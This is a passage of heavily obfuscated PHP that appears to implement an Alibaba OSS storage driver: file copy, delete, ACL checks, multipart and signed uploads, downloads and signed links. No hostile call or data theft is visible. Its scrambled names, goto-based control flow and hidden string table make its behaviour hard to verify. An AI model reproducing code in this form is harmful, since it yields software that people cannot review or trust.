$f¿¥óêŸ´¹); $CÃóÂ¸›ÂŒ[] = $this->client->uploadPartCopy($this->bucket, $this->pathEncode($cŠ¢İÙÊ·), $this->bucket, $this->pathEncode($F¼­È°†½™), $eÅ½öç“÷£, $CéæšÛˆ‚, $A‰›î­Ú¼˜); $eÅ½öç“÷£ = $eÅ½öç“÷£ + 1; } goto Fõêµ£Åˆ²; Fõêµ£Åˆ²: $b§íÏÈ‡Ì¦ = array(); foreach ($CÃóÂ¸›ÂŒ as $BŞ¬„†ƒ => $D³Õ’œ¡µ ) { $b§íÏÈ‡Ì¦[] = array($D÷¯âç­µ‚[922] => $BŞ¬„†ƒ + 1, $D÷¯âç­µ‚[923] => $D³Õ’œ¡µ ); } $a‰•ÀÓ¯Ú = $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($F¼­È°†½™), $CéæšÛˆ‚, $b§íÏÈ‡Ì¦); goto fÏâãóê‘¼; fÏâãóê‘¼: } catch (OSS\Core\OssException $AìŠÚ­Òòè) { return !1; } return !0; } public function moveFile($F†Ìß´—ëË, $C¨™¿ß„¢³) { if ($this->copyFile($F†Ìß´—ëË, $C¨™¿ß„¢³)) { $this->remove($F†Ìß´—ëË); return !0; } return !1; } public function delFile($CÄÂó¯®) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($CÄÂó¯®)); } catch (OSS\Core\OssException $f¾ñÊºáñ¯) { return !1; } return !0; } public function delFolder($AğœÌÊ‚íˆ) { $Aù»ƒ‹¯å =& $_SERVER[°Óó£ÌİóèÅ]; $DãçŒôµáö = $this->fileList($AğœÌÊ‚íˆ); if (!empty($AğœÌÊ‚íˆ) && !in_array(trim($AğœÌÊ‚íˆ, $Aù»ƒ‹¯å[8]) . $Aù»ƒ‹¯å[8], $DãçŒôµáö[$Aù»ƒ‹¯å[82]])) { $DãçŒôµáö[$Aù»ƒ‹¯å[82]][] = trim($AğœÌÊ‚íˆ, $Aù»ƒ‹¯å[8]) . $Aù»ƒ‹¯å[8]; } foreach (array_chunk($DãçŒôµáö[$Aù»ƒ‹¯å[82]], 1000) as $c£ãÓ ­) { try { $this->client->deleteObjects($this->bucket, $c£ãÓ ­); } catch (OSS\Core\OssException $fğ óÏ¦¡²) { return !1; } } return !0; } public function rename($càôƒÖŸÙƒ, $b¾Î‹­í±) { return $this->renameObject($càôƒÖŸÙƒ, $b¾Î‹­í±); } public function _size($D¤¯¶â¬¬Ğ) { if (!$this->_isFile($D¤¯¶â¬¬Ğ)) { return 0; } try { $cƒİ’Ô½Ãœ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($D¤¯¶â¬¬Ğ)); } catch (OSS\Core\OssException $AÃºÄ¼Ñç) { return !1; } return $cƒİ’Ô½Ãœ[$_SERVER[°Óó£ÌİóèÅ][924]] + 0; } public function _info($BŸ¦î ½å) { if ($this->_isFolder($BŸ¦î ½å)) { return $this->folderInfo($BŸ¦î ½å); } if (!$this->_isFile($BŸ¦î ½å)) { return !1; } return $this->fileInfo($BŸ¦î ½å); } private function fileInfo($Eïƒ½´ˆœ, $Cïô÷ÈÇ = array(), $EÔŸëâ‡‘Ì = false) { goto CšÄ©µÏÖÕ; AÊğØ…¨ÉÊ: if (empty($Cïô÷ÈÇ)) { $cï–ÛÂÀº = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Eïƒ½´ˆœ)); if (!$cï–ÛÂÀº) { return $dœí·ÛäÔ¼; } $Cïô÷ÈÇ = array($f£ÃğÉ«‚[195] => $cï–ÛÂÀº[$f£ÃğÉ«‚[925]][$f£ÃğÉ«‚[926]], $f£ÃğÉ«‚[198] => strtotime($cï–ÛÂÀº[$f£ÃğÉ«‚[927]]), $f£ÃğÉ«‚[86] => $cï–ÛÂÀº[$f£ÃğÉ«‚[924]] + 0); $this->fileInfoImage($Eïƒ½´ˆœ, $dœí·ÛäÔ¼); } $dœí·ÛäÔ¼[$f£ÃğÉ«‚[114]] = $Cïô÷ÈÇ[$f£ÃğÉ«‚[198]]; $dœí·ÛäÔ¼[$f£ÃğÉ«‚[86]] = $Cïô÷ÈÇ[$f£ÃğÉ«‚[86]]; goto a·Ù¡Î•ò; CšÄ©µÏÖÕ: $f£ÃğÉ«‚ =& $_SERVER[°Óó£ÌİóèÅ]; if ($EÔŸëâ‡‘Ì) { return array($f£ÃğÉ«‚[28] => $this->pathThis($Eïƒ½´ˆœ), $f£ÃğÉ«‚[84] => $this->getPathOuter($Eïƒ½´ˆœ), $f£ÃğÉ«‚[29] => $f£ÃğÉ«‚[172], $f£ÃğÉ«‚[165] => $this->ext($Eïƒ½´ˆœ), $f£ÃğÉ«‚[86] => isset($Cïô÷ÈÇ[$f£ÃğÉ«‚[86]]) ? $Cïô÷ÈÇ[$f£ÃğÉ«‚[86]] : 0); } $dœí·ÛäÔ¼ = array($f£ÃğÉ«‚[28] => $this->pathThis($Eïƒ½´ˆœ), $f£ÃğÉ«‚[84] => $this->getPathOuter($Eïƒ½´ˆœ), $f£ÃğÉ«‚[29] => $f£ÃğÉ«‚[172], $f£ÃğÉ«‚[195] => $f£ÃğÉ«‚[50], $f£ÃğÉ«‚[114] => $f£ÃğÉ«‚[50], $f£ÃğÉ«‚[86] => 0, $f£ÃğÉ«‚[165] => $this->ext($Eïƒ½´ˆœ), $f£ÃğÉ«‚[196] => !0, $f£ÃğÉ«‚[197] => !0); goto AÊğØ…¨ÉÊ; a·Ù¡Î•ò: if (isset($Cïô÷ÈÇ[$f£ÃğÉ«‚[195]])) { $dœí·ÛäÔ¼[$f£ÃğÉ«‚[195]] = $Cïô÷ÈÇ[$f£ÃğÉ«‚[195]]; } return $dœí·ÛäÔ¼; goto d¤ÚÄåãº‡; d¤ÚÄåãº‡: } private function folderInfo($bŒŠ·ö±ÇŸ, $EØ¼èØ¿ƒÒ = false) { $dê¯Ù–È™ƒ =& $_SERVER[°Óó£ÌİóèÅ]; if ($EØ¼èØ¿ƒÒ) { return array($dê¯Ù–È™ƒ[28] => $this->pathThis($bŒŠ·ö±ÇŸ), $dê¯Ù–È™ƒ[84] => $this->getPathOuter($dê¯Ù–È™ƒ[8] . $bŒŠ·ö±ÇŸ), $dê¯Ù–È™ƒ[29] => $dê¯Ù–È™ƒ[85]); } $B†›ˆÜĞŒ = array($dê¯Ù–È™ƒ[28] => $this->pathThis($bŒŠ·ö±ÇŸ), $dê¯Ù–È™ƒ[84] => $this->getPathOuter($dê¯Ù–È™ƒ[8] . $bŒŠ·ö±ÇŸ), $dê¯Ù–È™ƒ[29] => $dê¯Ù–È™ƒ[85], $dê¯Ù–È™ƒ[195] => $dê¯Ù–È™ƒ[50], $dê¯Ù–È™ƒ[114] => $dê¯Ù–È™ƒ[50], $dê¯Ù–È™ƒ[196] => !0, $dê¯Ù–È™ƒ[197] => !0); return $B†›ˆÜĞŒ; } public function exist($bÍÂæ¹˜ìÑ) { if ($this->_isFile($bÍÂæ¹˜ìÑ) || $this->_isFolder($bÍÂæ¹˜ìÑ)) { return !0; } return !1; } public function size($Fõ‹…Úª²±) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][896], $Fõ‹…Úª²±); } public function info($a­ª•Ò‡Œô) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][191], $a­ª•Ò‡Œô); } public function isFile($d¿íÄº…‡ä) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][192], $d¿íÄº…‡ä); } public function isFolder($cèº²ê¥ªŠ) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][193], $cèº²ê¥ªŠ); } public function _isFile($e•ˆÇË§ÉÈ) { if ($this->_isFolder($e•ˆÇË§ÉÈ)) { return !1; } try { return $this->client->doesObjectExist($this->bucket, $this->pathEncode($e•ˆÇË§ÉÈ)); } catch (OSS\Core\OssException $D»ç±ê—Ø) { return !1; } } public function _isFolder($DØõ“¡Á­) { $bÎ«ÂôŒÈª =& $_SERVER[°Óó£ÌİóèÅ]; try { $DØõ“¡Á­ = trim($DØõ“¡Á­, $bÎ«ÂôŒÈª[8]); $d´‘Ğø§Ï = array($bÎ«ÂôŒÈª[915] => $bÎ«ÂôŒÈª[8], $bÎ«ÂôŒÈª[194] => empty($DØõ“¡Á­) ? $bÎ«ÂôŒÈª[33] : $DØõ“¡Á­ . $bÎ«ÂôŒÈª[8], $bÎ«ÂôŒÈª[916] => 1, $bÎ«ÂôŒÈª[917] => $bÎ«ÂôŒÈª[33]); $c‚‰Óè‘•‹ = $this->client->listObjects($this->bucket, $d´‘Ğø§Ï); } catch (OSS\Core\OssException $a¬‹æŒÌñ¡) { return !1; } $a·æ–¨¿Îê = $c‚‰Óè‘•‹->getObjectList(); $D¤™«É¥ù· = $c‚‰Óè‘•‹->getPrefixList(); return empty($a·æ–¨¿Îê) && empty($D¤™«É¥ù·) ? !1 : !0; } public function listPath($dâ”ÎŒè°, $Bğ°ŸŞ  = false) { $AŠÖñõ¢¹ =& $_SERVER[°Óó£ÌİóèÅ]; $DÜ©Š¸¥Ùî = $this->fileList($dâ”ÎŒè°, $AŠÖñõ¢¹[8], 1); foreach ($DÜ©Š¸¥Ùî[$AŠÖñõ¢¹[83]] as $bÇ›…“²Ø¸ => $FÙÇÏÔ­Ş) { $DÜ©Š¸¥Ùî[$AŠÖñõ¢¹[83]][$bÇ›…“²Ø¸] = $this->folderInfo($FÙÇÏÔ­Ş, $Bğ°ŸŞ ); } foreach ($DÜ©Š¸¥Ùî[$AŠÖñõ¢¹[82]] as $bÇ›…“²Ø¸ => $Aè—Œø§ã¨) { $DÜ©Š¸¥Ùî[$AŠÖñõ¢¹[82]][$bÇ›…“²Ø¸] = $this->fileInfo($Aè—Œø§ã¨[$AŠÖñõ¢¹[28]], $Aè—Œø§ã¨, $Bğ°ŸŞ ); } return $DÜ©Š¸¥Ùî; } public function has($d¹¨ÌÏßÈ×, $còºîŒïÖ– = false, $cºÛ ÆÅù½ = true) { goto bóö—–òÇà; B·öÕğµ„ø: $bÆ‹Ş™´³ó = 0; while (!0) { $EõÃàäö®ô = array($d­äìŒÌë[915] => $d­äìŒÌë[8], $d­äìŒÌë[194] => $fÏõğ ØÉ…, $d­äìŒÌë[916] => $EĞ¤¦í÷¯Ü, $d­äìŒÌë[917] => $c”ë¦óŸ’á); try { $aé¸ë…¥ = $this->client->listObjects($this->bucket, $EõÃàäö®ô); } catch (OSS\Core\OssException $dĞàëƒ¤Õç) { break; } $c”ë¦óŸ’á = $aé¸ë…¥->getNextMarker(); $d¦§›ã™„ = $aé¸ë…¥->getObjectList(); $cŠÃÁ…Î = $aé¸ë…¥->getPrefixList(); if ($còºîŒïÖ–) { if (count($d¦§›ã™„) > 1 || $d¦§›ã™„[0]->getKey() != $fÏõğ ØÉ…) { $c˜„ê÷£Â» += count($d¦§›ã™„) - 1; } if (!empty($cŠÃÁ…Î)) { $bÆ‹Ş™´³ó += count($cŠÃÁ…Î); } if ($c”ë¦óŸ’á === $d­äìŒÌë[33]) { break; } continue; } if ($cºÛ ÆÅù½) { if (!empty($d¦§›ã™„)) { if (count($d¦§›ã™„) > 1 || $d¦§›ã™„[0]->getKey() != $fÏõğ ØÉ…) { return !0; } } } else { if (!empty($cŠÃÁ…Î)) { return !0; } } if ($c”ë¦óŸ’á === $d­äìŒÌë[33]) { break; } } if ($còºîŒïÖ–) { return array($d­äìŒÌë[199] => $c˜„ê÷£Â», $d­äìŒÌë[200] => $bÆ‹Ş™´³ó); } goto CºÎ×Øèò¹; cŠèØÙ‰¥ß: $c”ë¦óŸ’á = $d­äìŒÌë[33]; $EĞ¤¦í÷¯Ü = 500; $c˜„ê÷£Â» = 0; goto B·öÕğµ„ø; bóö—–òÇà: $d­äìŒÌë =& $_SERVER[°Óó£ÌİóèÅ]; $d¹¨ÌÏßÈ× = trim($d¹¨ÌÏßÈ×, $d­äìŒÌë[8]); $fÏõğ ØÉ… = empty($d¹¨ÌÏßÈ×) ? $d­äìŒÌë[33] : $d¹¨ÌÏßÈ× . $d­äìŒÌë[8]; goto cŠèØÙ‰¥ß; CºÎ×Øèò¹: return !1; goto d„â’Åöµ; d„â’Åöµ: } public function listAll($BõĞŸ‘·) { $AÓÀÍ½Êó =& $_SERVER[°Óó£ÌİóèÅ]; $FùÅÓ–¢ˆš = $this->fileList($BõĞŸ‘·, $AÓÀÍ½Êó[33], 1); $aîí‡’ŠÌ = array(); foreach ($FùÅÓ–¢ˆš[$AÓÀÍ½Êó[82]] as $aùíÀƒ®Š—) { $aîí‡’ŠÌ[$aùíÀƒ®Š—[$AÓÀÍ½Êó[28]]] = $aùíÀƒ®Š—[$AÓÀÍ½Êó[86]]; } return $this->listAllFiles($BõĞŸ‘·, array_keys($aîí‡’ŠÌ), $aîí‡’ŠÌ); } public function canRead($A…Ã‰ĞµÉª) { $D×–ô¾ğÓ´ =& $_SERVER[°Óó£ÌİóèÅ]; $cÅ¼êä™®Æ = $this->pathAcl($A…Ã‰ĞµÉª); return $cÅ¼êä™®Æ == $D×–ô¾ğÓ´[928] || $cÅ¼êä™®Æ == $D×–ô¾ğÓ´[929] ? !0 : !1; } public function canWrite($eÜ¾ÁËÅ¿‹) { $bé™±ìÈ = $this->pathAcl($eÜ¾ÁËÅ¿‹); return $bé™±ìÈ == $_SERVER[°Óó£ÌİóèÅ][929] ? !0 : !1; } public function pathAcl($Aõêœæ¸ŒÈ) { goto cµß…ßÀ†³; aòñÆã­¾Ñ: $aÔŠÑ’”¸” = $e µêÅ×ã == $dÌÇ‰ƒ‡Œ[34] ? $this->bucketAcl : $e µêÅ×ã; if ($aÔŠÑ’”¸” == $dÌÇ‰ƒ‡Œ[930]) { return $dÌÇ‰ƒ‡Œ[928]; } if ($aÔŠÑ’”¸” == $dÌÇ‰ƒ‡Œ[931]) { return $dÌÇ‰ƒ‡Œ[929]; } goto cÜ‹¿¯”‚; cµß…ßÀ†³: $dÌÇ‰ƒ‡Œ =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $e µêÅ×ã = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Aõêœæ¸ŒÈ)); } catch (OSS\Core\OssException $bß¨íÃæ¿) { return !1; } goto aòñÆã­¾Ñ; cÜ‹¿¯”‚: return $aÔŠÑ’”¸”; goto Dõ‚Ûç´âË; Dõ‚Ûç´âË: } private function chmodPath($eÒ†¯¢ê§Û, $D¢Ç²ç×Ø = '') { $BÉ©ÈÈ¥Š÷ =& $_SERVER[°Óó£ÌİóèÅ]; $e‡Ú›‰Ñ¦ = empty($D¢Ç²ç×Ø) ? $BÉ©ÈÈ¥Š÷[931] : $D¢Ç²ç×Ø; $e¶ù½ñ‚‘ï = array($BÉ©ÈÈ¥Š÷[34], $BÉ©ÈÈ¥Š÷[190], $BÉ©ÈÈ¥Š÷[930], $BÉ©ÈÈ¥Š÷[931]); if (!in_array($e‡Ú›‰Ñ¦, $e¶ù½ñ‚‘ï)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($eÒ†¯¢ê§Û), $e‡Ú›‰Ñ¦); } catch (OSS\Core\OssException $CÇ±‚ƒï‘) { return !1; } return !0; } public function getContent($D™©¬ œå«) { return $this->fileSubstr($D™©¬ œå«, -1); } public function setContent($dçˆğÅŸØ, $eŒˆìç»Í§ = '') { $cÜ¼ˆˆ©Åè =& $_SERVER[°Óó£ÌİóèÅ]; try { $CÃ¹Ôùíº¥ = array(); $FĞÀ»éí‡ = $this->client->putObject($this->bucket, $this->pathEncode($dçˆğÅŸØ), $eŒˆìç»Í§, $CÃ¹Ôùíº¥); } catch (OSS\Core\OssException $e£øÈŠ„‡Ï) { return !1; } $Dé³Öì£ô† = array($cÜ¼ˆˆ©Åè[918] => trim($FĞÀ»éí‡[$cÜ¼ˆˆ©Åè[932]], $cÜ¼ˆˆ©Åè[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dçˆğÅŸØ))); $this->updateObjMeta($dçˆğÅŸØ, $Dé³Öì£ô†); return isset($FĞÀ»éí‡[$cÜ¼ˆˆ©Åè[933]][$cÜ¼ˆˆ©Åè[879]]) ? (int) $FĞÀ»éí‡[$cÜ¼ˆˆ©Åè[933]][$cÜ¼ˆˆ©Åè[879]] : strlen($FĞÀ»éí‡); } private function updateObjMeta($a†®˜ìÅ·Ë, $e¥ÖäÛİ) { $a†®˜ìÅ·Ë = $this->pathEncode($a†®˜ìÅ·Ë); try { $d‡ô¬ÃÜÄÆ = array(OSS\OssClient::OSS_HEADERS => $e¥ÖäÛİ); $this->client->copyObject($this->bucket, $a†®˜ìÅ·Ë, $this->bucket, $a†®˜ìÅ·Ë, $d‡ô¬ÃÜÄÆ); } catch (OSS\Core\OssException $c¸ƒÏ°ãØ”) { return !1; } return !0; } public function upload($cóŠÔÖ”ğ, $DÕ¶ˆ’íé¥, $eŠ†ôî—‹» = false, $DƒÖÌƒÕ†ª = REPEAT_REPLACE) { $cö”Ï»¾º¨ =& $_SERVER[°Óó£ÌİóèÅ]; $Cà£î¤•ŸØ = trim($cóŠÔÖ”ğ, $cö”Ï»¾º¨[8]); $cØŠ†Œ·¨ñ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($cö”Ï»¾º¨[918] => @md5_file($DÕ¶ˆ’íé¥)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cóŠÔÖ”ğ))); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Cà£î¤•ŸØ), $DÕ¶ˆ’íé¥, $cØŠ†Œ·¨ñ); } catch (OSS\Core\OssException $aëÃ½ì‚·‡) { return !1; } return $this->getPathOuter($cóŠÔÖ”ğ); } public function getHost() { $AÄ²“Æñ˜· =& $_SERVER[°Óó£ÌİóèÅ]; $Bàƒî•ššË = explode($AÄ²“Æñ˜·[176], parent::getHost()); return $Bàƒî•ššË[0] . $AÄ²“Æñ˜·[176] . $this->bucket . $AÄ²“Æñ˜·[100] . $Bàƒî•ššË[1]; } public function uploadFormData($A¬œë”»ò, $Eê¤›ğ©Æ¸ = 3600) { goto D”èŸ¦‰Êƒ; Aİ‚œ¡±¬: $bã¾«²ƒ…Ì = array($c³ØÕ¨¬‹ƒ[936], 0, $D‡‡éô”à¾); $A‡øèÓ„Ø[] = $bã¾«²ƒ…Ì; $EàÔï¹ãš‰ = $this->pathFather($A¬œë”»ò); goto fÙ¿çäñ‘; aŒ†ÂÙ“òê: $b²íù£ ï = json_encode($Dè»®†¿…); $eõ²Üå°Í  = base64_encode($b²íù£ ï); $D¯†ä¸ÆÏ = base64_encode(hash_hmac($c³ØÕ¨¬‹ƒ[232], $eõ²Üå°Í , $this->secret, !0)); goto e§°ÁÑæ‰; e§°ÁÑæ‰: return array($c³ØÕ¨¬‹ƒ[849] => $eõ²Üå°Í , $c³ØÕ¨¬‹ƒ[937] => $this->accessKey, $c³ØÕ¨¬‹ƒ[845] => $c³ØÕ¨¬‹ƒ[837], $c³ØÕ¨¬‹ƒ[938] => $D¯†ä¸ÆÏ, $c³ØÕ¨¬‹ƒ[174] => $FçŒóÒª”Ó); goto e¯Ü©ÂÛµœ; a™™ñ”åšù: $aÀ®Å¡ÊÀ— = date($c³ØÕ¨¬‹ƒ[934], time() + $dÁĞŒÏê˜™); $A÷”Í©Éª’ = new DateTime($aÀ®Å¡ÊÀ—); $då¬‡‡˜ƒ  = $A÷”Í©Éª’->format(DateTime::ISO8601); goto eÏ›äÌ¥Éç; D”èŸ¦‰Êƒ: $c³ØÕ¨¬‹ƒ =& $_SERVER[°Óó£ÌİóèÅ]; if (!($FçŒóÒª”Ó = $this->getHost())) { return !1; } $dÁĞŒÏê˜™ = $Eê¤›ğ©Æ¸; goto a™™ñ”åšù; fÙ¿çäñ‘: $DŒ…¿˜ÏÁƒ = array($c³ØÕ¨¬‹ƒ[843], $c³ØÕ¨¬‹ƒ[844], $EàÔï¹ãš‰); $A‡øèÓ„Ø[] = $DŒ…¿˜ÏÁƒ; $Dè»®†¿… = array($c³ØÕ¨¬‹ƒ[839] => $då¬‡‡˜ƒ , $c³ØÕ¨¬‹ƒ[840] => $A‡øèÓ„Ø); goto aŒ†ÂÙ“òê; eÏ›äÌ¥Éç: $bù¯à¥ù‡ = strpos($då¬‡‡˜ƒ , $c³ØÕ¨¬‹ƒ[295]); $då¬‡‡˜ƒ  = substr($då¬‡‡˜ƒ , 0, $bù¯à¥ù‡) . $c³ØÕ¨¬‹ƒ[935]; $D‡‡éô”à¾ = 1048576000 * 5; goto Aİ‚œ¡±¬; e¯Ü©ÂÛµœ: } public function multiUploadFormData($Fì—Úø¹Å©, $Eø…ŒŠ•› = 3600) { $FåÕ…•»İô =& $_SERVER[°Óó£ÌİóèÅ]; if (!($b³öÎæ¨¢ç = $this->getHost())) { return !1; } $FÆä–æŸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Fì—Úø¹Å©)); return array($FåÕ…•»İô[224] => $FÆä–æŸ, $FåÕ…•»İô[174] => $b³öÎæ¨¢ç . $FåÕ…•»İô[8] . $this->pathEncode($Fì—Úø¹Å©), $FåÕ…•»İô[225] => gmdate($FåÕ…•»İô[939]), $FåÕ…•»İô[96] => $Fì—Úø¹Å©); } public function multiUploadAuthData($f¥Ì×”¡Ø, $d¤ÚÓë–Ó = array()) { goto c½³˜ ¥ˆ; eïÇÔÅğÑ: $a‘Ó´Õ©»á = $f¥Ì×”¡Ø; if (isset($d¤ÚÓë–Ó[$E‰Áõ¢«¸[96]])) { $a‘Ó´Õ©»á = $d¤ÚÓë–Ó[$E‰Áõ¢«¸[96]]; unset($d¤ÚÓë–Ó[$E‰Áõ¢«¸[96]]); } if (isset($d¤ÚÓë–Ó[$E‰Áõ¢«¸[226]])) { return $this->listUploadParts($a‘Ó´Õ©»á, $A´áÑğè“É, $d¤ÚÓë–Ó); } goto E²íõÅÓ…Ø; E²íõÅÓ…Ø: $Eğêíì ƒ” = array($E‰Áõ¢«¸[227], $E‰Áõ¢«¸[33], $E‰Áõ¢«¸[123], $A´áÑğè“É, "\x78\55\157\x73\163\55\x64\141\164\145\72{$A´áÑğè“É}", $E‰Áõ¢«¸[8] . $this->bucket . $E‰Áõ¢«¸[8] . $a‘Ó´Õ©»á . $DŞõ„Š¨Ú½); if (strpos($DŞõ„Š¨Ú½, $E‰Áõ¢«¸[228]) === 0) { $Eğêíì ƒ”[0] = $E‰Áõ¢«¸[229]; } if (isset($d¤ÚÓë–Ó[$E‰Áõ¢«¸[230]]) && $d¤ÚÓë–Ó[$E‰Áõ¢«¸[230]] == $E‰Áõ¢«¸[231]) { $Eğêíì ƒ”[0] = $E‰Áõ¢«¸[231]; } goto b´ÛØÂ¾§; b´ÛØÂ¾§: if (!empty($d¤ÚÓë–Ó[$E‰Áõ¢«¸[940]])) { $dŒÉ”Á½÷¾ = array_merge(array($Eğêíì ƒ”[4]), $d¤ÚÓë–Ó[$E‰Áõ¢«¸[940]]); sort($dŒÉ”Á½÷¾); $Eğêíì ƒ”[4] = implode($E‰Áõ¢«¸[61], $dŒÉ”Á½÷¾); } $EáÃ‹Ó“ùô = implode($E‰Áõ¢«¸[61], $Eğêíì ƒ”); $a¨ááœƒ¿ = base64_encode(hash_hmac($E‰Áõ¢«¸[232], $EáÃ‹Ó“ùô, $this->secret, !0)); goto b‘ÁÆ‘¡Ì; c½³˜ ¥ˆ: $E‰Áõ¢«¸ =& $_SERVER[°Óó£ÌİóèÅ]; $A´áÑğè“É = isset($d¤ÚÓë–Ó[$E‰Áõ¢«¸[225]]) ? $d¤ÚÓë–Ó[$E‰Áõ¢«¸[225]] : gmdate($E‰Áõ¢«¸[939]); $DŞõ„Š¨Ú½ = isset($d¤ÚÓë–Ó[$E‰Áõ¢«¸[165]]) ? $d¤ÚÓë–Ó[$E‰Áõ¢«¸[165]] : $E‰Áõ¢«¸[33]; goto eïÇÔÅğÑ; b‘ÁÆ‘¡Ì: $d™†ã†ƒ¾Ğ = $E‰Áõ¢«¸[941] . $this->accessKey . $E‰Áõ¢«¸[4] . $a¨ááœƒ¿; if (strpos($DŞõ„Š¨Ú½, $E‰Áõ¢«¸[228]) === 0) { $d™†ã†ƒ¾Ğ = array($E‰Áõ¢«¸[234] => $d™†ã†ƒ¾Ğ, $E‰Áõ¢«¸[225] => $A´áÑğè“É); } return $d™†ã†ƒ¾Ğ; goto b•“‰É§’„; b•“‰É§’„: } public function listUploadParts($aÑæ»ç ˆÉ, $e‚É‘ºéà‰, $DĞ¶Ã÷æğ†) { goto DêßâÁ³«; DêßâÁ³«: $eÎŸê­‰‘œ =& $_SERVER[°Óó£ÌİóèÅ]; $aÈ”Ó¸ÂĞ¡ = parse_url_query($DĞ¶Ã÷æğ†[$eÎŸê­‰‘œ[165]]); $D“äà©áš» = $this->client->listParts($this->bucket, $this->pathEncode($aÑæ»ç ˆÉ), $aÈ”Ó¸ÂĞ¡[$eÎŸê­‰‘œ[224]]); goto d‹›ƒ©‰–Á; BÅ³âÕÏ„: return array($eÎŸê­‰‘œ[234] => $Dóˆ½è“¨, $eÎŸê­‰‘œ[225] => $e‚É‘ºéà‰, $eÎŸê­‰‘œ[236] => $cÁáßÖÊ¾); goto BÔ­£œŒËº; eæï¯ç±µÙ: unset($DĞ¶Ã÷æğ†[$eÎŸê­‰‘œ[226]], $DĞ¶Ã÷æğ†[$eÎŸê­‰‘œ[230]]); $Dóˆ½è“¨ = $this->multiUploadAuthData($aÑæ»ç ˆÉ, $DĞ¶Ã÷æğ†); if (empty($Dóˆ½è“¨)) { return !1; } goto BÅ³âÕÏ„; d‹›ƒ©‰–Á: $E…¿×‚©å¯ = $D“äà©áš»->getListPart(); $cÁáßÖÊ¾ = array(); foreach ($E…¿×‚©å¯ as $f‹¶Ş×„) { $cÁáßÖÊ¾[] = array($eÎŸê­‰‘œ[922] => $f‹¶Ş×„->getPartNumber(), $eÎŸê­‰‘œ[923] => trim($f‹¶Ş×„->getETag(), $eÎŸê­‰‘œ[120])); } goto eæï¯ç±µÙ; BÔ­£œŒËº: } public function download($b“µ¬Ûá¬, $AÙ”õ“Ñ¥) { if ($this->isFolder($b“µ¬Ûá¬)) { return !1; } try { $C™Ğé¬Âí = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $AÙ”õ“Ñ¥); $this->client->getObject($this->bucket, $this->pathEncode($b“µ¬Ûá¬), $C™Ğé¬Âí); } catch (OSS\Core\OssException $fòÆ²ø³­) { return !1; } return $AÙ”õ“Ñ¥; } public function fileSubstr($a†àóÜ”÷, $F£´¾•³È = 0, $A•å‡Ë˜Ù… = false) { if ($F£´¾•³È === -1) { $A‘æÙò­ = array(); } else { if ($A•å‡Ë˜Ù… === !1) { $EØ‰Š”î›» = $this->size($a†àóÜ”÷); } else { $EØ‰Š”î›» = $F£´¾•³È + $A•å‡Ë˜Ù… - 1; } $A‘æÙò­ = array(OSS\OssClient::OSS_RANGE => "{$F£´¾•³È}\x2d{$EØ‰Š”î›»}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($a†àóÜ”÷), $A‘æÙò­); } catch (OSS\Core\OssException $f¡ˆãÔËçœ) { return !1; } } public function link($aĞ„Œî°Ü‡, $c½š®ãÉ×ä = array()) { if (!$this->exist($aĞ„Œî°Ü‡) || $this->isFolder($aĞ„Œî°Ü‡)) { return !1; } try { return $this->client->signUrl($this->bucket, $this->pathEncode($aĞ„Œî°Ü‡), 3600 * 12, $_SERVER[°Óó£ÌİóèÅ][231], $c½š®ãÉ×ä); } catch (OSS\Core\OssException $Bôï˜ë‚) { return !1; } } public function fileOut($Dğõ ƒĞ£í, $eéºáó³ = false, $cİâ©œÕ› = false, $aØ„Äˆœ® = '') { goto bÆ±ãÒ¢‰•; b¢”éÎœÔ²: if ($eÚ¸Ú±—ÚĞ && $eÚ¸Ú±—ÚĞ >= 819200 && $eÚ¸Ú±—ÚĞ <= 838860800) { $C–¸ªóÕ„á[OSS\OssClient::OSS_SUB_RESOURCE] .= $DÅ¾ĞØ¸¦[944] . $eÚ¸Ú±—ÚĞ; } $A‰ —“µ‚ = $this->link($Dğõ ƒĞ£í, $C–¸ªóÕ„á); $this->fileOutLink($A‰ —“µ‚); goto eâë§­‚¢ø; B×—×ÚÎâø: $C–¸ªóÕ„á = array(OSS\OssClient::OSS_SUB_RESOURCE => $DÅ¾ĞØ¸¦[942] . rawurlencode("{$eéºáó³}\x3b\x66\151\154\x65\x6e\x61\155\x65\75{$cİâ©œÕ›}")); $C–¸ªóÕ„á[OSS\OssClient::OSS_SUB_RESOURCE] .= $DÅ¾ĞØ¸¦[943] . $B«Ñˆ¡·Ö…; $eÚ¸Ú±—ÚĞ = intval($GLOBALS[$DÅ¾ĞØ¸¦[6]][$DÅ¾ĞØ¸¦[92]][$DÅ¾ĞØ¸¦[98]][$DÅ¾ĞØ¸¦[112]] * 1024 * 1024 * 8); goto b¢”éÎœÔ²; BÊ–¸ÚŞÏ: if ($B«Ñˆ¡·Ö… == $DÅ¾ĞØ¸¦[209]) { return parent::fileOut($Dğõ ƒĞ£í, $eéºáó³, $cİâ©œÕ›, $aØ„Äˆœ®); } $eéºáó³ = $eéºáó³ ? $DÅ¾ĞØ¸¦[210] : $DÅ¾ĞØ¸¦[211]; $cİâ©œÕ› = $this->pathEncode($cİâ©œÕ›); goto B×—×ÚÎâø; bÆ±ãÒ¢‰•: $DÅ¾ĞØ¸¦ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$cİâ©œÕ›) { $cİâ©œÕ› = $this->pathThis($Dğõ ƒĞ£í); } $B«Ñˆ¡·Ö… = get_file_mime(get_path_ext($cİâ©œÕ›)); 